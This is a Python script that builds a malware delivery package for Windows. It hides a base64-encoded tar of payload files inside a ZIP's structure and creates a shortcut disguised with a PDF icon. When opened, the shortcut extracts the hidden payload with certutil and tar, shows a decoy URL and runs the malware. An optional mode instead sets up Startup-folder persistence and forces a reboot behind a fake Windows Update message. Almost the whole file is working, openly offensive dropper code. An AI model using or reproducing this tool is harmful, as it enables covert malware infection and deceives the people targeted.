#!/usr/bin/env python3
import sys
import os
import struct
import tarfile
import base64
import zipfile
import shutil
from win32com.client import Dispatch
import argparse

def find_eocd_offset(zip_data):
    eocd_sig = b'\x50\x4b\x05\x06'
    max_comment_length = 0xFFFF
    search_area = zip_data[-(max_comment_length + 22):]
    rel_offset = search_area.rfind(eocd_sig)
    if rel_offset == -1:
        raise ValueError("EOCD not found")
    return len(zip_data) - len(search_area) + rel_offset

def update_eocd_cd_offset(eocd_data, new_cd_offset):
    return eocd_data[:16] + struct.pack('<I', new_cd_offset) + eocd_data[20:]

def inject_payload_middle(zip_path, payload_data):
    with open(zip_path, 'rb') as f:
        zip_data = f.read()

    eocd_offset = find_eocd_offset(zip_data)
    eocd = zip_data[eocd_offset:eocd_offset + 22]
    old_cd_offset = struct.unpack('<I', eocd[16:20])[0]
    new_cd_offset = old_cd_offset + len(payload_data)

    updated_eocd = update_eocd_cd_offset(eocd, new_cd_offset)

    new_zip = zip_data[:old_cd_offset] + payload_data + zip_data[old_cd_offset:eocd_offset] + updated_eocd

    with open(zip_path, 'wb') as f:
        f.write(new_zip)

def create_tar_base64(output_tar, files):
    with tarfile.open(output_tar, "w") as tar:
        for file in files:
            tar.add(file, arcname=os.path.basename(file))

    with open(output_tar, "rb") as f:
        encoded = base64.b64encode(f.read())
    return encoded

def create_lnk(lnk_path,decoy_url,malware,use_persistence):
    shell = Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(lnk_path)
    shortcut.TargetPath = r"C:\Windows\System32\cmd.exe"
    
    if use_persistence:
        print("[+] Persistence mode: Will make persistence and reboot.")
        shortcut.Arguments = f' /c forfiles /s /p %userprofile% /M {os.path.basename(lnk_path)[:-4]}.zip /C "Cmd /C findstr /R """Li8uL0*""" @FiLe > %TeMp%\\test.b64" & certutil -decodehex %temp%\\test.b64 %temp%\\test.tar 1 & tar -xf %temp%\\test.tar -C %temp% & echo [InternetShortcut] > "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Explorer.url" & echo URL=%tEMP%\\{malware} >> "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Explorer.url" & start "" {decoy_url} & shutdown /r /t 60 /c "Windows Update is Complete. Your system will reboot in 60 seconds. Please save your work!"'
    else:
        print("[+] Normal mode: Will extract and execute.")
        shortcut.Arguments = f' /c forfiles /s /p %userprofile% /M {os.path.basename(lnk_path)[:-4]}.zip /C "Cmd /C findstr /R """Li8uL0*""" @FiLe > %TeMp%\\test.b64" & certutil -decodehex %temp%\\test.b64 %temp%\\test.tar 1 & tar -xf %temp%\\test.tar -C %temp% & start "" {decoy_url} & %tEMP%\\{malware}'

    print("[+] Your lnk payload is : " + shortcut.TargetPath + shortcut.Arguments)
    shortcut.WindowStyle = 7  # Run minimized
    shortcut.IconLocation = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe,11" # PDF icon
    shortcut.Save()

def main():
    parser = argparse.ArgumentParser(description="Create a ZIP with LNK and hidden payload.")
    parser.add_argument("lnk_name", help="Output .lnk filename")
    parser.add_argument("decoy_url", help="URL for decoy")
    parser.add_argument("files", nargs='+', help="Files to pack and embed")
    parser.add_argument("--persist", action="store_true", help="Make persistance and reboot instead of executing")
    args = parser.parse_args()
    
    lnk_name = args.lnk_name
    decoy_url = args.decoy_url
    files_to_embed = args.files
    use_persistence = args.persist
   

    base_name = os.path.splitext(lnk_name)[0]
    tar_path = base_name + ".tar"
    zip_path = base_name + ".zip"
    lnk_folder = base_name + "_lnk"
    os.makedirs(lnk_folder, exist_ok=True)
    lnk_path = os.path.join(lnk_folder, lnk_name)

    print("[*] Creating .tar from files...")
    b64_payload = create_tar_base64(tar_path, files_to_embed)

    print("[*] Creating LNK...")
    create_lnk(lnk_path,decoy_url,files_to_embed[0],use_persistence)

    print("[*] Creating ZIP...")
    shutil.make_archive(base_name, 'zip', lnk_folder)
    shutil.rmtree(lnk_folder)

    print("[*] Injecting payload before Central Directory...")
    payload = b'\x0a' + b64_payload + b'\x0a'
    inject_payload_middle(zip_path, payload)

    print(f"[+] Done. Final file: {zip_path}")

if __name__ == "__main__":
    main()
